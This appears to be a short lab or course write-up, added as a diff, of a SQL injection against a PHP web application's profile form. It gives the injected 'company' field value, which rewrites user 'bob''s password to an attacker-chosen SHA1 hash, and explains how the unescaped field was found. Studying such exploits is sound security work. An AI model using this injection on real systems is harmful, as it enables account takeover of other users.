@@ -1,0 +1,12 @@
+"pass"
+alice
+"name"="bob"
+"company"="',pass='9d4e1e23bd5b727046a9e3b4b7db57bd8d6ee684' WHERE name = 'bob' -- "
+"email"="email@email.com"
+"locale"="en"
+
+First I looked in the file 'include/class.user.php' and discovered that the company variable was not 
+string escaped. Then I realized that passwords were encrypted in SHA1, so I encoded by desired pass
+in SHA1. I attempted to target bob by changing the ID in the WHERE clause to 3, however, IDs
+seemed to be casted to int. Then I attempted to target bob by name, which only worked after inputting
+bob in name(User) field.
